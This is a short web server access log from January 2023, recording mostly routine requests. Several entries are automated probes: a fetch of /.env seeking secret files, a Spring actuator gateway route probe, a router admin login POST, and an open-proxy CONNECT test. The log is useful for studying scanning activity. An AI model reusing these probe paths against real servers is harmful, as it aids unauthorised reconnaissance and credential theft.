193.32.162.159 - - [22/Jan/2023:15:50:23 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
152.89.196.211 - - [22/Jan/2023:15:56:23 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
143.110.222.166 - - [22/Jan/2023:16:05:51 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
152.89.196.211 - - [22/Jan/2023:16:14:17 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
152.89.196.211 - - [22/Jan/2023:16:23:56 -0600] "GET /actuator/gateway/routes HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
62.233.50.179 - - [22/Jan/2023:17:01:11 -0600] "\x03" 400 226 "-" "-"
143.110.222.166 - - [22/Jan/2023:17:02:58 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.254.196.223 - - [22/Jan/2023:17:25:59 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [22/Jan/2023:17:25:59 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
193.35.18.189 - - [22/Jan/2023:17:28:02 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
143.110.222.166 - - [22/Jan/2023:18:01:12 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
197.232.15.88 - - [22/Jan/2023:18:04:22 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
23.90.160.114 - - [22/Jan/2023:18:06:29 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
92.118.39.82 - - [22/Jan/2023:18:28:14 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
143.110.222.166 - - [22/Jan/2023:19:08:30 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
223.18.127.4 - - [22/Jan/2023:19:18:26 -0600] "GET /robots.txt HTTP/1.1" 301 251 "-" "Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36"
179.43.177.242 - - [22/Jan/2023:19:27:00 -0600] "GET / HTTP/1.1" 301 232 "-" "Hello World"
13.52.215.156 - - [22/Jan/2023:19:52:44 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
167.94.138.62 - - [22/Jan/2023:20:00:14 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
167.94.138.62 - - [22/Jan/2023:20:00:14 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.62 - - [22/Jan/2023:20:00:14 -0600] "PRI * HTTP/2.0" 400 226 "-" "-"
143.110.222.166 - - [22/Jan/2023:20:10:02 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
173.214.175.178 - - [22/Jan/2023:20:15:32 -0600] "CONNECT google.com:443 HTTP/1.1" 301 232 "-" "Go-http-client/1.1"
